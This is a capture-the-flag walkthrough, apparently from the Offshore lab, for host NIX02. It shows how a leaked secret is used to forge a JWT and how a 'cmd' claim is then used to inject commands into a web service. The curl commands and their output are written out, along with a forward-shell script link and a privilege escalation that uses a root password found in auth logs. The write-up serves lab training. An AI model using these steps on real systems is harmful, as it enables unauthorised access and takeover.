<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NIX02 - 172.16.1.22</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NIX02 - 172.16.1.22</h1><br/><p><a href="Offshore--NIX02_-_172.16.1.22_22.html#OFS-Flag25">Flag 25</a></p><p><a href="Offshore--NIX02_-_172.16.1.22_22.html#OFS-Flag26">Flag 26</a></p><p></p><p>For this machine, it looks like an authorization token is needed</p><p></p><p><img src="images/22-1.png" alt="images/22-1.png" /></p><p></p><p>If you look this error up on Google, it mentions JWT token</p><p></p><p>Let&#39;s try to inject one</p><p></p><p><code><span style="background-color:#000000;">└─$ curl http://172.16.1.22:3000/ -H &#39;Authorization: Bearer aniqfakhrul&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">token contains an invalid number of segments</span></code></p><p></p><p>There was a goMonitor project we found on WS03 - let&#39;s check that </p><p></p><p><img src="images/22-2.png" alt="images/22-2.png" /></p><p></p><p>Let&#39;s create our JWT token from this secret</p><p></p><p>Go to <a href="https://jwt.io/">https://jwt.io/</a></p><p>Put the secret into the the verify signature box on the bottom right</p><p><code><span style="background-color:#000000;">PSmu3dR2wMZQvNge</span></code></p><p></p><p>And we get </p><p><code><span style="background-color:#000000;">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.L_kMikkX9ZpItQamGNfuQ2aM5Beeo06SrmvscCPRsSg</span></code></p><p></p><p>Now if we curl the request with this, it doesn&#39;t say no access, it gives an empty reply so we know we&#39;re on the right track</p><p></p><p><code><span style="background-color:#000000;">└─$ curl http://172.16.1.22:3000/ -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.L_kMikkX9ZpItQamGNfuQ2aM5Beeo06SrmvscCPRsSg&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">curl: (52) Empty reply from server</span></code></p><p></p><p>If we change one of the parameters when generating this token we can inject commands</p><p></p><p><img src="images/22-3.png" alt="images/22-3.png" /></p><p></p><p><code><span style="background-color:#000000;">└─$ curl http://172.16.1.22:3000/ -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiY21kIjoiaG9zdG5hbWUifQ.1eeBwp0FDbdkRS8LPAmIVLnidF4Av0kJxOQ_S6M3ts4&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">nix02</span></code></p><p></p><p>Instead of hostname, try ls</p><p></p><p><code><span style="background-color:#000000;">└─$ curl http://172.16.1.22:3000/ -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiY21kIjoibHMifQ.1TP8QuGhAw9lQ4-WOYU-qGT6LtTPN-IlDSqp2a0DDC0&#39; </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">bin</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">boot</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">cdrom</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">dev</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">etc</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">home</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">initrd.img</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">initrd.img.old</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">lib</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">lib64</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">lost+found</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">media</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mnt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">opt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">proc</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">root</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">run</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">sbin</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">snap</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">srv</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">swapfile</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">sys</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">tmp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">usr</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">var</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">vmlinuz</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">vmlinuz.old</span></code></p><p></p><p></p><p>We can use this script to automate the process</p><p><a href="https://github.com/Xyan1d3/JWT_Forward_Shell/blob/main/forward_shell.py">https://github.com/Xyan1d3/JWT_Forward_Shell/blob/main/forward_shell.py</a></p><p></p><p>Update the IP/port and the JWT signature token in this script and it should give you a shell you can use</p><p></p><p>get our user flag</p><p></p><p><code><span style="background-color:#000000;">Xyan1d3&gt; cat /home/joe/Desktop/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag25"></a>OFFSHORE{Pr0t3ct_Th05e_5ecr3ts}</p><p></p><p></p><p><img src="images/22-4.png" alt="images/22-4.png" /></p><p></p><p>We notice we&#39;re part of the adm group which allows you to view logs</p><p>Let&#39;s look at the available logs</p><p></p><p>Going through these logs we see a possible root password in auth.log.1</p><p></p><p><code><span style="background-color:#000000;">Aug  3 03:13:29 nix02 su[2417]: No passwd entry for user &#39;rootHWaKJkUFgRe56WzG&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Aug  3 03:13:29 nix02 su[2417]: FAILED su for rootHWaKJkUFgRe56WzG by joe</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Aug  3 03:13:29 nix02 su[2417]: - /dev/pts/0 joe:rootHWaKJkUFgRe56WzG</span></code></p><p></p><p>Let&#39;s try to upgrade our forward shell with</p><p><code><span style="background-color:#000000;">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></code></p><p></p><p>Privesc and get the second flag</p><p></p><p><code><span style="background-color:#000000;">Xyan1d3&gt; python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">joe@nix02:/$                                                                                                                                                                                                      </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Xyan1d3&gt; su root</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">su root                                                                                                                                                                                                           </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Password:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Xyan1d3&gt; HWaKJkUFgRe56WzG</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">                                                                                                                                                                                                                  </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">root@nix02:/#</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Xyan1d3&gt; ls /root</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ls /root                                                                                                                                                                                                          </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">root@nix02:/#</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Xyan1d3&gt; cat /root/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">cat /root/flag.txt                                                                                                                                                                                                </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag26"></a>OFFSHORE{W@tCH_TH05e_Gr0up$}</p><p>root@nix02:/#</p><p></p><p></p><p></p></div>
</body>
</html>
